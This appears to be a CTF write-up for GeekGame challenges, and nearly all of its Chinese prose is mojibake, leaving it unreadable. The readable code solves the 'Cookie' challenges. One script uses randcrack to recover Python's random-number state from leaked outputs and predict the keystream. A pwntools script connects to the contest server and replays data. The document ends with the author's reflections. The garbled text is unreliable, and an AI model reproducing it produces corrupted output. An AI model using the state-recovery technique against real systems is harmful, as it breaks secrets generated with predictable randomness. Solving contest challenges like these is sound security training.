  å¦‚æœçœ‹åˆ°ã€ 0ğŸ‘¼ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
  å›é€€å¾ªç¯å–µï¼š
    å¦‚æœçœ‹åˆ°ã€\[ğŸ¤”ã€‘å°±è·³è½¬åˆ°ã€Myg0ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\]ğŸ¤”ã€‘å°±è·³è½¬åˆ°ã€Crych1cã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€.ğŸ¤”ã€‘å°±è·³è½¬åˆ°ã€Soy0ã€‘å–µ
    Myg0ï¼š
      æŠŠã€\]ğŸ˜ˆã€‘æ›¿æ¢æˆã€ğŸ˜ˆã€‘å–µ
      å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€Soy0ã€‘å–µ
    Crych1cï¼š
      æŠŠã€ğŸ˜ˆã€‘æ›¿æ¢æˆã€]ğŸ˜ˆã€‘å–µ
    Soy0ï¼š
      æŠŠã€(.)ğŸ¤”ã€‘æ›¿æ¢æˆã€ğŸ¤”\1ã€‘å–µ
      å¦‚æœçœ‹åˆ°ã€ğŸ˜¡ğŸ˜ˆã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
      å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å›é€€å¾ªç¯å–µã€‘å–µ

è¾“å‡ºå–µï¼š
  æŠŠã€ğŸ¤”\.ã€‘æ›¿æ¢æˆã€.ğŸ¤”ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ 32ğŸ‘¼ã€‘å°±è·³è½¬åˆ°ã€Case32ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€ 33ğŸ‘¼ã€‘å°±è·³è½¬åˆ°ã€Case33ã€‘å–µ
# æ­¤å¤„çœç•¥è‹¥å¹²è¡Œ
  å¦‚æœçœ‹åˆ°ã€ 122ğŸ‘¼ã€‘å°±è·³è½¬åˆ°ã€Case122ã€‘å–µ
  å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
  Case32ï¼š
    æŠŠã€$ã€‘æ›¿æ¢æˆã€ ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
  Case33ï¼š
    æŠŠã€$ã€‘æ›¿æ¢æˆã€!ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ
# æ­¤å¤„çœç•¥è‹¥å¹²è¡Œ
  Case122ï¼š
    æŠŠã€$ã€‘æ›¿æ¢æˆã€zã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^ã€‘å°±è·³è½¬åˆ°ã€å¼€å¤´å–µã€‘å–µ

ç»“æŸå–µï¼š
  æŠŠã€^(.|\s)*ğŸ˜­ã€‘æ›¿æ¢æˆã€ã€‘å–µ
  è°¢è°¢å–µ
```

# 0x14. å°ç« é±¼çš„æ›²å¥‡

## Smol Cookie

é¢˜ç›®è¦æ±‚é¢„æµ‹ python çš„ Random åº“çš„è¾“å‡º, æœç´¢åˆ° `randcrack` åº“, ç›´æ¥è°ƒç”¨å³å¯.

```py
from Crypto.Util.number import *
from pwn import *
from ast import literal_eval
from subprocess import getoutput
from randcrack import RandCrack
from random import Random

def xor_arrays(a, b, *args):
    if args:
        return xor_arrays(a, xor_arrays(b, *args))
    return bytes([x ^ y for x, y in zip(a, b)])

rc = RandCrack()
str = "<string from server>"

flag_len = (len (str) - 5000) // 2
words = bytes.fromhex (str)

for i in range (624):
    rc.submit (int.from_bytes (words[i*4:i*4+4], byteorder = 'little'))
assert int.from_bytes (words[2496:2500], byteorder = 'little') == rc.predict_getrandbits (32)
print (xor_arrays (rc.predict_getrandbits (flag_len * 8).to_bytes (flag_len, byteorder = 'little'), words[2500:]))
```

## Big Cookie

æœç´¢ python çš„ [random åº“å®ç°](https://github.com/python/cpython/blob/main/Modules/_randommodule.c#L287), å‘ç°å®ƒä¼šå…ˆå¯¹ç§å­å–ç»å¯¹å€¼, æ‰€ä»¥äº’ä¸ºç›¸åæ•°çš„ç§å­ç­‰ä»·, å¼‚æˆ–ä¹‹åæŠµæ¶ˆ, å‰©ä¸‹éƒ¨åˆ†ä¸ flag1 ç›¸åŒ.

## SUPA BIG Cookie

ç›¸åŒçš„ç§å­ç»™å‡ºç›¸åŒè¾“å‡º, å¤è¯»ä¸€éå°±å¥½äº†.

```py
from Crypto.Util.number import *
from pwn import *
from ast import literal_eval
from subprocess import getoutput
from randcrack import RandCrack
from random import Random

r = remote ('prob08.geekgame.pku.edu.cn', 10008)
r.recvuntil (b'token: ')
r.sendline (b'70:This_is_token')
r.sendlineafter (b'Choose one: ', b'3')
r.recvuntil (b'.\n')
words = r.recvline ().strip ()
r.sendline (words[1:-1])
r.interactive ()
```

# 0xFE. ç®€å•çš„æ„Ÿæƒ³

![](6.png)

> ç­‰ä¸€ä¸‹, ä¸è¦èµ°! ä¸æ˜¯è¿™æ ·çš„! æˆ‘æ˜¯çœŸçš„å¾ˆçè§† GeekGame, å¾ˆå–œæ¬¢ GeekGame!  
> ä¸è¦! æ±‚æ±‚ä½ ! è¦æ˜¯æ²¡æœ‰å¤§ä¸€èŒæ–°èƒ½åšçš„é¢˜çš„è¯, æˆ‘å°±...  
> *...æ”¾å¼€æˆ‘*  
> è¦æˆ‘æ€ä¹ˆåšä½ ä»¬æ‰è‚¯å‡ºèŒæ–°é¢˜? åªè¦æ˜¯æˆ‘èƒ½å­¦çš„, æˆ‘ä»€ä¹ˆéƒ½æ„¿æ„å­¦!  
> *...ä½ æ˜¯æŠ±ç€å¤šå¤§çš„è§‰æ‚Ÿè¯´å‡ºè¿™ç§è¯çš„? ä½ åªä¸è¿‡æ˜¯ä¸€ä¸ªè®¡ç½‘éƒ½æ²¡å­¦è¿‡çš„å½©ç¬”, æœ‰åŠæ³•åšå‡º GeekGame çš„ Web é¢˜å—?"ä»€ä¹ˆéƒ½æ„¿æ„å­¦"å°±æ˜¯è¿™ä¹ˆæ²‰é‡çš„è¯, åšä¸æ¥çš„äº‹å°±åˆ«éšä¾¿è¯´å‡ºå£!*  
> å¯æ˜¯, æˆ‘çœŸçš„...  
> ~~*äº²å¾ˆæ³¨é‡è‡ªå·±çš„å†…å¿ƒæ„Ÿå—å‘¢ :)*~~

# 0xFF. å†·é…·çš„æ„Ÿæƒ³

ä»Šå¹´çš„ GeekGame æ˜¯æˆ‘å‚åŠ çš„ç¬¬ä¸€åœº CTF æ¯”èµ›, ~~å¤§æ¦‚å¾ˆå¯èƒ½ä¹Ÿæ˜¯æœ€åä¸€åœº.~~

å®é™…ä¸Šæˆ‘æ˜¯æœ€è¿‘æ‰äº†è§£åˆ° CTF å¤§æ¦‚æ˜¯æ€ä¹ˆå›äº‹. ä»¥å‰è™½ä¹…ä»°å¤§å, ä½†é™äºçŸ¥è¯†æ°´å¹³, æ¯æ¬¡éƒ½è¢«åºå¤§çš„çŸ¥è¯†é‡åŠé€€. ä¸Šå¤§å­¦åæ€»ç®—æ˜¯å­¦è¿‡ä¸€ç‚¹è®¡ç®—æœºåŸºç¡€çŸ¥è¯†, çœ‹åˆ°å¹´çº§ç¾¤é‡Œçš„å®£ä¼ å°±å»å­¦ä¹ äº†ä¸€ä¸‹, å‘ç°ç»ˆäºæœ‰èƒ½åšçš„é¢˜äº†~~æ„ŸåŠ¨å–µ~~.

ç°åœ¨æ„Ÿè§‰ CTF ç¡®å®æ¯”ç®—æ³•ç«èµ›æœ‰æ„æ€å¤šäº†, åŸå› åœ¨äºæˆ‘ä¸ªäººæ¯”èµ·ç›´æ¥åšå‡ºå·§å¦™çš„æ€ç»´é¢˜, æ›´å–œæ¬¢å­¦ä¹ å‰äººå·²æœ‰çš„æ–¹æ³•, å†å°†å…¶åº”ç”¨åˆ°ç°åœ¨çš„é—®é¢˜ä¸­. è€Œ CTF å†…å®¹çš„ç¹æ‚æ­£å¥½æ»¡è¶³äº†æˆ‘å­¦ä¹ æ–°çŸ¥è¯†çš„éœ€æ±‚. äºæ˜¯æˆ‘ç´§æ€¥ç”¨å›½åº†å‡æœŸåŠ è®­äº†å„ç§åŸºç¡€çŸ¥è¯†, ä»¥åŠ ida å’Œ pwntools çš„ç”¨æ³•.

è¿™åœºæ¯”èµ›é‡Œæˆ‘æœ€å–œæ¬¢çš„é¢˜ ~~(å½“ç„¶åªèƒ½åœ¨æˆ‘è¿‡çš„é¢˜é‡Œé€‰ qwq)~~ å°±æ˜¯ TypeScript é¢˜äº†, åŸå› æ˜¯è¿™ç§é¢˜ç›®èƒŒæ™¯å¾ˆåƒæˆ‘ä»¥å‰åšè¿‡çš„å„ç§**äº¤äº’é¢˜**â€”â€”å³é€šè¿‡ç»™å®šçš„äº¤äº’æ–¹å¼ (æŒ‡è¿è¡Œä»£ç ) æ‹¿åˆ°éšå«ä¿¡æ¯ (æŒ‡ flag), è€Œä¸”æˆ‘å‰å‡ å¤©åˆ·å¾€å¹´é¢˜ (æŒ‡å»å¹´ Hackergame) åšåˆ°äº† "LaTeX æœºå™¨äºº" è¿™é¢˜, æˆ‘å‡­å€Ÿå¤©å¤©ç”¨ LaTeX å†™ä½œä¸šçš„ç»éªŒæŠŠè¿™é¢˜ç§’äº†. æ‰€ä»¥å½“æˆ‘çœ‹åˆ° TypeScript è¿™é¢˜çš„æ—¶å€™å°±æƒ³ç›´æ¥å¼€åš, ä½†é—®é¢˜æ˜¯æˆ‘~~tm~~å¯¹å‰ç«¯è¯­è¨€ä¸€çªä¸é€š, è¿ html éƒ½ä¸äº†è§£æ›´åˆ«è¯´ JS ç”šè‡³ TS äº†. æˆ‘åªèƒ½ä»å¤´å¼€å§‹å­¦ä¹  TS çš„è¯­æ³•å’Œå„ç§è¯­è¨€ç‰¹æ€§, æŸ¥é˜…èƒ½æ‰¾åˆ°çš„æ‰€æœ‰ stackoverflow å¸–å­. å°±è¿™æ ·è¿‡äº†æ¯«æ— è¿›å±•çš„ä¸€ä¸ªä¸Šåˆ, æˆ‘æ—¶å¸¸æƒ³è¦ç›´æ¥æ”¾å¼ƒä½†æ¯æ¬¡éƒ½è¢«~~æ²‰æ²¡çš„æ—¶é—´æˆæœ¬è£¹æŒŸ~~ç²¾å¦™çš„é¢˜ç›®èƒŒæ™¯å¸å¼•. æœ€ç»ˆæˆ‘æ€»å…±çœ‹äº†ä¸‰åå¤šä¸ªå¸–å­, ä¸ä¸‹åæ¬¡çš„"ä½ ~~tm~~ä¸ä¼šç”¨æšä¸¾ç±»å‹å—", ä¸€ä¸ªä¸€ä¸ªå°è¯•æ˜¯å¦å¯¹åšé¢˜æœ‰å¸®åŠ©, æœ€åä¸€ç¯‡å°±æ˜¯ä¸Šè¿°é¢˜è§£é‡Œè´´çš„é“¾æ¥. å½“æ—¶æˆ‘æ¿€åŠ¨åˆ°ä»€ä¹ˆç±»å‹æ¨æ–­éƒ½ä¸ç®¡äº†ç›´æ¥å¼€æ•², æ¯•ç«Ÿå‡ ç™¾æ¬¡è¯¢é—®åªç”¨åå‡ åˆ†é’Ÿ, è€Œâ€œæœç´¢åˆ°â€ä¸‰ä¸ªå­—å°±ç”¨äº† 8 ä¸ªå°æ—¶. è¿™ç§"å±±é‡æ°´å¤"ååˆ"æŸ³æš—èŠ±æ˜"çš„ä½“éªŒå¯æ˜¯æˆ‘åœ¨æ•´ä¸ªäººç”Ÿç»å†é‡Œéƒ½å°‘æœ‰çš„.

åé¢æˆ‘é¡ºç€è¿™ä¸ªåŠ²å¤´è‚äº†ä¸€æ•´åœº, è™½ç„¶å¾ˆç´¯ä½†ä¹Ÿéå¸¸å¼€å¿ƒ! æœ€åå–å¾—è¿™ä¸ªæˆç»©ä¹Ÿæ˜¯è¿œè¿œè¶…å‡ºé¢„æœŸ, ~~çœ‹æ¥å®¢æœå°ç¥¥çš„å‡ºé¢˜ç»„çœŸçš„å‡ºäº†å¾ˆå¤šèŒæ–°é¢˜ /bx~~

æ„Ÿè°¢å„ä½å‡ºé¢˜äºº, Staff ~~A å’Œå®¢æœ S~~, æˆ‘åœ¨è¿™å‡ å¤©çœŸçš„æ”¶è·å¾ˆå¤š! è™½ç„¶æˆ‘æ˜å¹´åº”è¯¥æ²¡æ—¶é—´å‚åŠ äº†, ä½†å¸Œæœ›æ‚¨ä»¬å¯ä»¥ç»§ç»­åŠ æ²¹æŠŠæ¯”èµ›å¥½å¥½åŠä¸‹å», å†æ¬¡æ„Ÿè°¢!